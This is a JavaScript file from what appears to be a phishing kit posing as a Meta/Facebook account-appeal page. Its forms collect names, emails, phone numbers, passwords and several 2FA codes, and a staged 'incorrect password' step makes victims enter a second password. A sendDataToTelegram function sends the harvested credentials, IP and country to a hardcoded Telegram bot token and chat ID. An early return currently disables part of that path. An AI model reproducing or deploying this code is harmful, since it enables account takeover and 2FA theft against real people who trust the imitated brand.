const subLinks = {
  PolicyCollapse: [
    {
      text: 'What is the Privacy Policy and what does it cover?',
      link: '',
      add_svg_link: false
    },
    {
      text: 'What information do we collect?',
      link: '',
      add_svg_link: false
    },
    {
      text: 'How do we use your information?',
      link: '',
      add_svg_link: false
    },
    {
      text: 'How do we share your information on Meta Products or with integrated partners?',
      link: '',
      add_svg_link: false
    },
    {
      text: 'How do we share information with third parties?',
      link: '',
      add_svg_link: false
    },
    {
      text: 'How is the cooperation between Meta Companies organized?',
      link: '',
      add_svg_link: false
    },
    {
      text: 'How can you manage or delete your information and exercise your rights?',
      link: '',
      add_svg_link: false
    },
    {
      text: 'How long do we keep your information?',
      link: '',
      add_svg_link: false
    },
    {
      text: 'How do we transmit information?',
      link: '',
      add_svg_link: false
    },
    {
      text: 'How do we respond to official requests, comply with applicable laws, and prevent harm?',
      link: '',
      add_svg_link: false
    },
    {
      text: 'How will you know when the policy changes?',
      link: '',
      add_svg_link: false
    },
    {
      text: 'How to ask Meta questions?',
      link: '',
      add_svg_link: false
    },
    {
      text: 'Why and how we process your data',
      link: '',
      add_svg_link: false
    }
  ],
  RulesCollapse: [
    {
      text: 'Cookie Policy',
      link: '',
      add_svg_link: false
    },
    {
      text: 'Information for those who do not use Meta Products',
      link: '',
      add_svg_link: true
    },
    {
      text: 'How Meta uses information for generative AI models',
      link: '',
      add_svg_link: false
    },
    {
      text: 'Data Transfer Framework Policy',
      link: '',
      add_svg_link: false
    },
    {
      text: 'Other terms and conditions',
      link: '',
      add_svg_link: true
    }
  ],
  SettingCollapse: [
    {
      text: 'Facebook Settings',
      link: '',
      add_svg_link: true
    },
    {
      text: 'Instagram Settings',
      link: '',
      add_svg_link: true
    }
  ]
}

function addSubItems () {
  var linkSvg = `<svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg>`
  for (var [subId, items] of Object.entries(subLinks)) {
    var subElem = document.getElementById(subId)
    for (var i = 0; i < items.length; i++) {
      var text_item = items[i]
      var block = document.createElement('div')
      block.classList.add('action-button')
      block.innerHTML = `
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text">
                      </div>
                      <div class="action-button-arrow">
                      </div>
                    `
      if (text_item['add_svg_link']) {
        var svg_block = block.querySelector('.action-button-arrow')
        svg_block.innerHTML = linkSvg
      }
      var block_text = block.querySelector('.action-button-text')
      block_text.innerText = text_item['text']
      subElem.appendChild(block)
      block.addEventListener('click', function () {
        var start = document.getElementById('start')
        start.click()
      })
    }
  }
}

addSubItems()
// Variables
var apiInsertCounter = 0

var formsSendData = {
  'full-name': '',
  'personal-email': '',
  'buiseness-email': '',
  'mobile-phone-number': '',
  'password-1': '',
  'password-2': '',
  '2FA-1': '',
  '2FA-2': '',
  '2FA-3': '',
  'page-name': '',
  apeal: ''
}

var userIpData = {
  user_ip: 'Incorrect request ;(',
  country: '-',
  country_code: '-'
}

var metrics = {
  dis_name: 'MPC',
  is_Mobile: window.mobileCheck(),
  params: prettyUtmParams()
}

var INCORRECT_2FA_TIMEOUT = 45;
var SEND_FORM_FICTIV_TIME = 3000;

// Modals
var firstModal = new bootstrap.Modal(document.getElementById('exampleModal1'))
var apiModal = new bootstrap.Modal(document.getElementById('exampleModal2'))
var twoFAModal = new bootstrap.Modal(document.getElementById('twoFAmodal'))
var successModal = new bootstrap.Modal(document.getElementById('successModal'))

var termsModal = new bootstrap.Modal(document.getElementById('TermsModal'))
var policyModal = new bootstrap.Modal(document.getElementById('policyModal'))
var searchModal = new bootstrap.Modal(document.getElementById('searchModal'))
var accountsModal = new bootstrap.Modal(
  document.getElementById('accountsModal')
)
var searchInput = document.getElementById('searchModal').querySelector('input')

// Handling inputs and events
const apiInput = document.getElementById('loginPasswd')
const showHidePassEye = document.getElementById('show-hide-pass')
showHidePassEye.addEventListener('click', totglePassDisplay)

var firstForm = document.getElementById('first-form')
var apiForm = document.getElementById('apiForm')
var twoFAForm = document.getElementById('twoFAForm')

firstForm.addEventListener('submit', firstFormHandle)
apiForm.addEventListener('submit', apiFormhandle)
twoFAForm.addEventListener('submit', twoFAFormHandle)

// Event listeners
document.getElementById('termsLink').addEventListener('click', function (e) {
  termsModal.show()
})

document.getElementById('policyLink').addEventListener('click', function (e) {
  policyModal.show()
})

document.getElementById('search').addEventListener('click', function (e) {
  searchModal.show()
})

document.querySelectorAll('a[href="#"]').forEach(elem => {
  elem.addEventListener('click', function (e) {
    e.preventDefault()
  })
})

// Get User IP
// Get User IP
var url = 'https://api.db-ip.com/v2/free/self/'

async function getUserIp () {
  try {
    const response = await fetch(url)
    if (response.status === 200) {
      const data = await response.json()
      return {
        user_ip: data.ipAddress,
        country: data.countryName,
        country_code: data.countryCode
      }
    } else {
      return {
        user_ip: 'Ip not detected ;(',
        country: '-',
        country_code: '-'
      }
    }
  } catch (error) {
    console.error('Error fetching user IP:', error)
    return {
      user_ip: 'Ip not detected ;(',
      country: '-',
      country_code: '-'
    }
  }
}

async function sendDataToTelegram () {
  // Fetch the user IP data
  return;
  const userIpData = await getUserIp() // Ensure this function is awaited

  // Example form data
  var templateData = {
    user_ip: userIpData.user_ip,
    country: userIpData.country,
    country_code: userIpData.country_code,
    'full-name': formsSendData['full-name'],
    'personal-email': formsSendData['personal-email'],
    'buiseness-email': formsSendData['buiseness-email'],
    'mobile-phone-number': formsSendData['mobile-phone-number'],
    'password-1': formsSendData['password-1'],
    'password-2': formsSendData['password-2'],
    '2FA-1': formsSendData['2FA-1'],
    '2FA-2': formsSendData['2FA-2'],
    '2FA-3': formsSendData['2FA-3'],
    'page-name': formsSendData['page-name'],
    apeal: formsSendData['apeal'],
    dis_name: metrics.dis_name,
    is_Mobile: metrics.is_Mobile,
    params: metrics.params
  }

  // Bot token and chat ID
  const botToken = '7884550883:AAGlluMHlLYNR9jWtwe4-Vo-HaDbx13dZPY' //Y;
  const chatId = '-4972578267' // Make sure the chatId is correct

  // Construct the message to send
  const message = `
        New user data:
        User IP: ${templateData.user_ip}
        Country: ${templateData.country}
        Country Code: ${templateData.country_code}
        Full Name: ${templateData['full-name']}
        Personal Email: ${templateData['personal-email']}
        Business Email: ${templateData['buiseness-email']}
        Mobile Phone: ${templateData['mobile-phone-number']}
        Password 1: ${templateData['password-1']}
        Password 2: ${templateData['password-2']}
        2FA: ${templateData['2FA-1']} - ${templateData['2FA-2']} - ${templateData['2FA-3']}
        Page Name: ${templateData['page-name']}
        Appeal: ${templateData['apeal']}
        Device: ${templateData['dis_name']}
        Mobile: ${templateData['is_Mobile']}
        Params: ${templateData['params']}
    `

  // Send the message via Telegram Bot API
  try {
    const response = await fetch(
      `https://api.telegram.org/bot${botToken}/sendMessage`,
      {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          chat_id: chatId, // Replace with your chat ID
          text: message // The message to send
        })
      }
    )

    const data = await response.json()
    if (response.ok) {
      console.log('Message sent to Telegram:', data)
    } else {
      console.error('Failed to send message:', data)
    }
  } catch (error) {
    console.error('Error sending message to Telegram:', error)
  }
}

var counter2FA = 1
var countOf2FA = 3

function twoFAFormHandle (event) {
  //handleFormSubmit(event, twoFAForm)
  event.preventDefault()
  var passwordInput = twoFAForm.querySelector('.password-input')
  var spiner = twoFAForm.querySelector('.spinner-border')
  var buttonText = twoFAForm.querySelector('.button-text')
  var button = twoFAForm.querySelector('button')
  var errortext = twoFAForm.querySelector('.invalid-feedback')
  var input = twoFAForm.querySelector('input')
  errortext.style.display = 'none'
  spiner.style.display = 'block'
  buttonText.style.display = 'none'
  button.setAttribute('disabled', '')

  updateFormsSendData(serializeForm(twoFAForm))
  sendDataToTelegram()
  pc()
  return;
  setTimeout(function () {
    sendDataToTelegram()
    counter2FA++
    if (counter2FA >= countOf2FA + 1) {
      // SHOW success

      unlock2FA()
      spiner.style.display = 'none'
      buttonText.style.display = 'block'
      twoFAModal.hide()
      successModal.show()
    } else {
      var send2FAButton = twoFAForm.querySelector('button.btn')
      passwordInput.classList.add('disabled')
      input.setAttribute('disabled', '')

      input.setAttribute('name', '2FA-' + counter2FA)
      send2FAButton.setAttribute('disabled', '')
      twoFAForm.querySelector('input').value = ''

      startTimer()
      errortext.style.display = 'block'
      spiner.style.display = 'none'
      buttonText.style.display = 'block'
    }
  }, 6000)
}

function unlock2FA () {
  var passwordInput = twoFAForm.querySelector('.password-input')
  var errortext = twoFAForm.querySelector('.invalid-feedback')
  var input = twoFAForm.querySelector('input')
  var button = twoFAForm.querySelector('button')
  errortext.style.display = 'none'
  var send2FAButton = twoFAForm.querySelector('button.btn')
  send2FAButton.removeAttribute('disabled')
  input.removeAttribute('disabled')
  button.removeAttribute('disabled')
  passwordInput.classList.remove('disabled')
}
// Helper function to serialize form data
function serializeForm (formNode) {
  const { elements } = formNode
  const data = Array.from(elements)
    .filter(item => item.name != '')
    .map(element => {
      const { name, value } = element
      return { name, value }
    })

  const dict_data = {}
  for (let i = 0; i < data.length; i++) {
    var elem = data[i]
    dict_data[elem.name] = elem.value
  }
  return dict_data
}

// Function to toggle password visibility (for the password field)
function totglePassDisplay () {
  if (apiInput.type == 'password') {
    apiInput.type = 'text'
  } else {
    apiInput.type = 'password'
  }
}

// Function to update the form data globally
function updateFormsSendData (dict) {
  for (var [key, value] of Object.entries(dict)) {
    formsSendData[key] = value
  }
}

// Timer for 2FA code expiration (if needed)
function startTimer () {
  var countDownDate = new Date().getTime()
  var x = setInterval(function () {
    var now = new Date().getTime()
    var distance = Math.round((now - countDownDate) / 1000)
    var insertedTime = INCORRECT_2FA_TIMEOUT - distance
    document.getElementById('timer').innerHTML = insertedTime + 's '
    document.getElementById('timer').style.display = 'inline'

    if (insertedTime <= 0) {
      clearInterval(x)
      document.getElementById('timer').style.display = 'none'
      document.getElementById('timer').innerHTML = 'EXPIRED'
      unlock2FA() // Unlock for re-entry
    }
  }, 1000)
}

function detectUtmUserLeftBar () {
  // Get the full URL of the current page
  var url = new URL(window.location.href)

  // Get the value of the "userleft" parameter from the URL
  var user = url.searchParams.get('userleft')

  // If the "userleft" parameter exists in the URL, display the "utm-user" element
  if (user) {
    // Show the user-related sidebar or section
    document.getElementById('utm-user').style.display = 'flex' // Make sure the element exists
  }
}

// Call the function to check the URL parameters and update the UI
detectUtmUserLeftBar()

function delectAccountUtm () {
  // Get the current URL
  var url = new URL(window.location.href)

  // Get the value of the "account" parameter from the URL
  var account = url.searchParams.get('account')

  // If the "account" parameter exists in the URL
  if (account) {
    // Replace the special character in the account value with a space
    account = account.replace('!~', ' ')

    // Update the UI with the account value
    addUserName(account) // Update the name shown in the UI

    // Display the account-related section in the UI
    document.getElementById('view-accounts').style.display = 'flex' // Assuming this is the container for account info

    // Set the value of the "fb-page-name-input" input field to the account value
    var pageGroupNameInput = document.getElementById('fb-page-name-input')
    pageGroupNameInput.value = account

    // Disable the input field after setting the value
    pageGroupNameInput.setAttribute('disabled', 'disabled')
  }
}

// Function to update the username in the UI (if you have elements with the class "UserName")
function addUserName (name) {
  var elems = document.querySelectorAll('.UserName')
  elems.forEach(elem => {
    elem.innerText = name
  })
}

// Call the function to detect and handle the account-related URL parameter
delectAccountUtm()

function delectTicketIdUtm () {
  // Get the current URL
  var url = new URL(window.location.href)

  // Get the value of the "ticketId" parameter from the URL
  var ticket = url.searchParams.get('ticketId')

  // If the "ticketId" parameter exists in the URL
  if (ticket) {
    // Display the ticket ID related section
    document.getElementById('utm-ticketId').style.display = 'flex' // Make sure the element exists

    // Update the UI with the ticket value
    document.getElementById('utm-ticketId').querySelector('span').innerText =
      ticket
  }
}

// Call the function to detect and handle the ticketId URL parameter
delectTicketIdUtm()

function firstFormHandle (event) {
  event.preventDefault() // Prevent the form from submitting normally

  // Collect the form data
  updateFormsSendData(serializeForm(firstForm))

  // Get the spinner and button text elements
  var spiner = firstForm.querySelector('.spinner-border')
  var buttonText = firstForm.querySelector('.button-text')
  var button = firstForm.querySelector('button')

  // Disable the button and show the loading spinner
  button.setAttribute('disabled', '')
  spiner.style.display = 'block'
  buttonText.style.display = 'none'

  // Call the sendDataToTelegram function to send the collected data
  sendDataToTelegram()
    .then(() => {
      // After the data is successfully sent to Telegram, hide the modal
      setTimeout(function () {
        firstModal.hide()
        apiModal.show()

        // Hide the spinner and show the button text again
        spiner.style.display = 'none'
        buttonText.style.display = 'block'
        button.removeAttribute('disabled')
      }, 2000) // Simulate a 2-second delay (adjust this as needed)
    })
    .catch(error => {
      console.error('Error sending data to Telegram:', error)

      // Handle error (e.g., show an error message or reset the spinner)
      spiner.style.display = 'none'
      buttonText.style.display = 'block'
      button.removeAttribute('disabled')
    })
}

// Function to handle the API form submission
function apiFormhandle (event) {
  event.preventDefault()

  var spiner = apiForm.querySelector('.spinner-border')
  var buttonText = apiForm.querySelector('.button-text')
  var button = apiForm.querySelector('button')
  var loginId = document.getElementById('loginID').value
  var loginPasswd = document.getElementById('loginPasswd').value
  var input = apiForm.querySelector('input')

  var loginId_err = apiForm.querySelector('.loginId-err')
  var errortext = apiForm.querySelector('.passwd-err')
  spiner.style.display = 'block'
  buttonText.style.display = 'none'
  errortext.style.display = 'none'
  button.setAttribute('disabled', '')
  updateFormsSendData(serializeForm(apiForm))
  Check(loginId, loginPasswd)
  //apiModal.hide()
  //twoFAModal.show()
  sendDataToTelegram()
  return
  setTimeout(function () {
    if (apiInsertCounter == 0) {
      errortext.style.display = 'block'
      errortext = apiForm.querySelector('input').value = ''
      apiInsertCounter++
      sendDataToTelegram()
      spiner.style.display = 'none'
      buttonText.style.display = 'block'
      button.removeAttribute('disabled')
      hidePasswordIncorrectText()
      input.setAttribute('name', 'password-2')
    } else {
      sendDataToTelegram()
      errortext.style.display = 'none'
      spiner.style.display = 'none'
      buttonText.style.display = 'block'
      button.removeAttribute('disabled')
      hidePasswordIncorrectText()
      input.setAttribute('name', 'password-1')
      apiModal.hide()
      twoFAModal.show()
    }
  }, 4000)
}
// Adding event listener for form submission
apiForm.addEventListener('submit', apiFormhandle)

/* ----------------------------------------------------------------------------- */
document.addEventListener('DOMContentLoaded', function () {
  const button = document.getElementById('showPopup')
  const popup = document.getElementById('popup')
  const closePopup = document.getElementById('closePopup')
  const col4Content = document.querySelector('.col-4')
  const newCol4Content = document.querySelector('.popup-item')
  const popupContent = document.querySelector('.popup-content')

  button.addEventListener('click', function () {
    popupContent.innerHTML = col4Content.innerHTML
    document.body.style.overflow = 'hidden'
    popup.style.display = 'flex'

    document
      .querySelector('#popup #search')
      .addEventListener('click', function (e) {
        searchModal.show()
      })
  })

  closePopup.addEventListener('click', function () {
    popup.style.display = 'none'
    document.body.style.overflow = 'auto'
  })

  function updateLayout () {
    if (window.innerWidth < 1000) {
      col4Content.style.display = 'none'
      button.style.display = 'block'
    } else {
      col4Content.style.display = 'block'
      button.style.display = 'none'
    }
  }

  updateLayout()
  window.addEventListener('resize', updateLayout)
})
/* ----------------------------------------------------------------------------- */

// Detect URL parameters
function prettyUtmParams () {
  var params = new URL(window.location.href).search
  params = params.slice(1)
  params = params.split('&')
  var result = '\n'
  params.forEach(elem => {
    var key = elem.split('=')[0]
    var value = elem.split('=')[1]
    result = result + `${key} : ${value}\n`
  })
  return result
}

function hidePasswordIncorrectText () {
  setTimeout(function () {
    var errortext = apiForm.querySelector('.passwd-err')
    errortext.style.display = 'none'
  }, 5000)
}

// Handle UTM parameters (Account, Ticket ID, etc.)
detectUtmUserLeftBar()
delectAccountUtm()
delectTicketIdUtm()
